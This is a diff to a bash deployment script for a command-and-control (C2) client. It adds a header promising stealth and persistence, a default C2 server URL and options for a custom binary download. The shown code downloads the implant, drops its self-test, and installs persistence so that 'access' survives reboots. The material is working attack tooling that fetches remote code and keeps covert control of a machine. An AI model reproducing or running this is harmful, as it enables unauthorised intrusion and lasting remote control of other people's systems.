@@ -1,5 +1,31 @@
  #!/usr/bin/env bash
 
+# ═══════════════════════════════════════════════════════════════════════════════
+# Rust C2 Framework - Client Deployment System
+# ═══════════════════════════════════════════════════════════════════════════════
+# 
+# A sophisticated deployment framework for Rust C2 client with advanced
+# stealth capabilities and persistence mechanisms.
+#
+# Usage Examples:
+#   $ bash deploy.sh
+#   $ SECRET="your_secret" bash deploy.sh
+#   $ SERVER_URL="http://your-server:8080" SECRET="your_secret" bash deploy.sh
+#   $ BINARY_URL="https://example.com/shadowgate-linux-x86_64" SECRET="your_secret" bash deploy.sh
+
+#   $ DEBUG=1 SECRET="your_secret" bash deploy.sh
+#
+# Environment Variables:
+#   SECRET          - Required encryption secret for C2 communication
+#   SERVER_URL      - C2 server URL (default: https://gate.haxor-world.org)
+#   BINARY_URL      - Custom binary download URL
+
+#   DEBUG           - Enable verbose debugging output
+#   NO_INSTALL      - Skip persistence installation
+#   STEALTH_MODE    - Enable stealth features (default: enabled)
+#
+# ═══════════════════════════════════════════════════════════════════════════════
+
 [[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"
 
 RED="\033[31m" 
@@ -370,14 +396,6 @@ if download_binary "$CLIENT_PATH" "$BINARY_URL"; then
 else
   print_fail 
   print_fatal "Binary download failed! Exiting..."
-fi
-
-print_progress "Testing client binary"
-if $CLIENT_PATH --help &>"$ERR_LOG";then 
-  print_ok 
-else 
-  print_fail 
-  print_fatal "Binary test failed! Exiting..."
 fi
 
 install ||  print_error "Permanent install methods failed! Access will be lost after reboot."
